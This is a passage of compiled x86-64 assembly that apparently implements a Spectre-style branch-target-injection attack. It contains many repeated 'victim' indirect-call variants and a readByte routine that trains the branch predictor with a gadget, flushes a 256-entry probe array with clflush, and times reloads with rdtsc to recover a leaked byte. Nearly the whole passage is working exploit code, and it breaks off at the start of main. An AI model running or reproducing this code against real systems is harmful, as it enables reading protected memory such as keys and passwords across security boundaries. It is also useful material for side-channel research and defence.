.Lvictim_win0_var936:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 937
.Lvictim_win0_var937:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 938
.Lvictim_win0_var938:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 939
.Lvictim_win0_var939:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 940
.Lvictim_win0_var940:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 941
.Lvictim_win0_var941:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 942
.Lvictim_win0_var942:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 943
.Lvictim_win0_var943:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 944
.Lvictim_win0_var944:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 945
.Lvictim_win0_var945:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 946
.Lvictim_win0_var946:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 947
.Lvictim_win0_var947:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 948
.Lvictim_win0_var948:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 949
.Lvictim_win0_var949:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 950
.Lvictim_win0_var950:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 951
.Lvictim_win0_var951:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 952
.Lvictim_win0_var952:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 953
.Lvictim_win0_var953:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 954
.Lvictim_win0_var954:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 955
.Lvictim_win0_var955:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 956
.Lvictim_win0_var956:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 957
.Lvictim_win0_var957:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 958
.Lvictim_win0_var958:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 959
.Lvictim_win0_var959:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 960
.Lvictim_win0_var960:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 961
.Lvictim_win0_var961:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 962
.Lvictim_win0_var962:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 963
.Lvictim_win0_var963:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 964
.Lvictim_win0_var964:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 965
.Lvictim_win0_var965:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 966
.Lvictim_win0_var966:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 967
.Lvictim_win0_var967:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 968
.Lvictim_win0_var968:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 969
.Lvictim_win0_var969:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 970
.Lvictim_win0_var970:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 971
.Lvictim_win0_var971:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 972
.Lvictim_win0_var972:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 973
.Lvictim_win0_var973:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 974
.Lvictim_win0_var974:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 975
.Lvictim_win0_var975:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 976
.Lvictim_win0_var976:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 977
.Lvictim_win0_var977:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 978
.Lvictim_win0_var978:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 979
.Lvictim_win0_var979:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 980
.Lvictim_win0_var980:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 981
.Lvictim_win0_var981:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 982
.Lvictim_win0_var982:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 983
.Lvictim_win0_var983:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 984
.Lvictim_win0_var984:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 985
.Lvictim_win0_var985:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 986
.Lvictim_win0_var986:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 987
.Lvictim_win0_var987:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 988
.Lvictim_win0_var988:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 989
.Lvictim_win0_var989:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 990
.Lvictim_win0_var990:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 991
.Lvictim_win0_var991:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 992
.Lvictim_win0_var992:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 993
.Lvictim_win0_var993:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 994
.Lvictim_win0_var994:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 995
.Lvictim_win0_var995:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 996
.Lvictim_win0_var996:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 997
.Lvictim_win0_var997:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 998
.Lvictim_win0_var998:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 999
.Lvictim_win0_var999:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
.Lvictim_win0_continue:
	movl	%eax, %ebx
	## InlineAsm End
	movl	%ebx, -36(%rbp)    # # 4-byte Spill
	movl	-36(%rbp), %eax    # # 4-byte Reload
	movl	%eax, -32(%rbp)
	movl	-32(%rbp), %eax
	andl	-24(%rbp), %eax
	popq	%rbx
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_readByte                       ## -- Begin function readByte
	.p2align	4, 0x90
_readByte:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$1120, %rsp    # # imm = 0x460
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, -8(%rbp)
	movq	%rdi, -1048(%rbp)
	movq	%rsi, -1056(%rbp)
	movq	%rdx, -1064(%rbp)
	movl	$0, -1088(%rbp)
	movb	$36, -1113(%rbp)
	movl	$0, -1072(%rbp)
LBB3_1:                                 ## =>This Inner Loop Header: Depth=1
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	movl	-1072(%rbp), %eax
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB3_1 Depth=1
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_1
LBB3_4:
	movl	$999, -1068(%rbp)    # # imm = 0x3E7
LBB3_5:                                 ## =>This Loop Header: Depth=1
                                        ##     Child Loop BB3_7 Depth 2
                                        ##     Child Loop BB3_11 Depth 2
                                        ##     Child Loop BB3_15 Depth 2
                                        ##     Child Loop BB3_21 Depth 2
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	leaq	_gadget(%rip), %rcx
	movq	%rcx, (%rax)
	mfence
	movl	$29, -1076(%rbp)
LBB3_7:                                 ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	xorl	%esi, %esi
	callq	_victim
	xorl	-1088(%rbp), %eax
	movl	%eax, -1088(%rbp)
## %bb.9:                               ##   in Loop: Header=BB3_7 Depth=2
	movl	-1076(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -1076(%rbp)
	jmp	LBB3_7
LBB3_10:                                ##   in Loop: Header=BB3_5 Depth=1
	mfence
	movl	$0, -1072(%rbp)
LBB3_11:                                ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	clflush	(%rax)
## %bb.13:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_11
LBB3_14:                                ##   in Loop: Header=BB3_5 Depth=1
	mfence
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	leaq	_safe_target(%rip), %rcx
	movq	%rcx, (%rax)
	mfence
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	clflush	(%rax)
	mfence
	movq	-1048(%rbp), %rdi
	xorl	%esi, %esi
	callq	_victim
	xorl	-1088(%rbp), %eax
	movl	%eax, -1088(%rbp)
	mfence
	movl	$0, -1072(%rbp)
LBB3_15:                                ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -1084(%rbp)
	movl	-1084(%rbp), %eax
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	movq	%rax, -1112(%rbp)
	rdtsc
	shlq	$32, %rdx
	orq	%rdx, %rax
	movq	%rax, -1096(%rbp)
	movq	-1112(%rbp), %rax
	movzbl	(%rax), %eax
	xorl	-1088(%rbp), %eax
	movl	%eax, -1088(%rbp)
	mfence
	rdtsc
	shlq	$32, %rdx
	orq	%rdx, %rax
	subq	-1096(%rbp), %rax
	movq	%rax, -1104(%rbp)
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	addl	$1, %ecx
	movl	%ecx, -1040(%rbp,%rax,4)
LBB3_18:                                ##   in Loop: Header=BB3_15 Depth=2
	jmp	LBB3_19
LBB3_19:                                ##   in Loop: Header=BB3_15 Depth=2
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_15
LBB3_20:                                ##   in Loop: Header=BB3_5 Depth=1
	movl	$-1, -1080(%rbp)
	movl	$-1, -1076(%rbp)
	movl	$0, -1072(%rbp)
LBB3_21:                                ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jl	LBB3_24
## %bb.23:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	movslq	-1076(%rbp), %rcx
	cmpl	-1040(%rbp,%rcx,4), %eax
	jl	LBB3_25
LBB3_24:                                ##   in Loop: Header=BB3_21 Depth=2
	movl	-1076(%rbp), %eax
	movl	%eax, -1080(%rbp)
	movl	-1072(%rbp), %eax
	movl	%eax, -1076(%rbp)
	jmp	LBB3_29
LBB3_25:                                ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	movslq	-1080(%rbp), %rcx
	cmpl	-1040(%rbp,%rcx,4), %eax
	jl	LBB3_28
LBB3_27:                                ##   in Loop: Header=BB3_21 Depth=2
	movl	-1072(%rbp), %eax
	movl	%eax, -1080(%rbp)
LBB3_28:                                ##   in Loop: Header=BB3_21 Depth=2
	jmp	LBB3_29
LBB3_29:                                ##   in Loop: Header=BB3_21 Depth=2
	jmp	LBB3_30
LBB3_30:                                ##   in Loop: Header=BB3_21 Depth=2
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_21
LBB3_31:                                ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	movslq	-1080(%rbp), %rcx
	movl	-1040(%rbp,%rcx,4), %ecx
	shll	%ecx
	addl	$5, %ecx
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jne	LBB3_35
## %bb.33:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1080(%rbp), %rax
	cmpl	$0, -1040(%rbp,%rax,4)
	jne	LBB3_35
LBB3_34:
	jmp	LBB3_37
LBB3_35:                                ##   in Loop: Header=BB3_5 Depth=1
	jmp	LBB3_36
LBB3_36:                                ##   in Loop: Header=BB3_5 Depth=1
	movl	-1068(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -1068(%rbp)
	jmp	LBB3_5
LBB3_37:
	movl	-1088(%rbp), %eax
	xorl	-1040(%rbp), %eax
	movl	%eax, -1040(%rbp)
	movl	-1076(%rbp), %eax
	movb	%al, %cl
	movq	-1056(%rbp), %rax
	movb	%cl, (%rax)
	movslq	-1076(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	movq	-1064(%rbp), %rax
	movl	%ecx, (%rax)
	movl	-1080(%rbp), %eax
	movb	%al, %cl
	movq	-1056(%rbp), %rax
	movb	%cl, 1(%rax)
	movslq	-1080(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	movq	-1064(%rbp), %rax
	movl	%ecx, 4(%rax)
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	-8(%rbp), %rcx
	cmpq	%rcx, %rax
	jne	LBB3_39
## %bb.38:
	addq	$1120, %rsp    # # imm = 0x460
	popq	%rbp
	retq
LBB3_39:
	callq	___stack_chk_fail
	.cfi_endproc
                                        ## -- End function
	.globl	_main                           ## -- Begin function main
	.p2align	4, 0x90
_main:
	.cfi_startproc
## %bb.0:
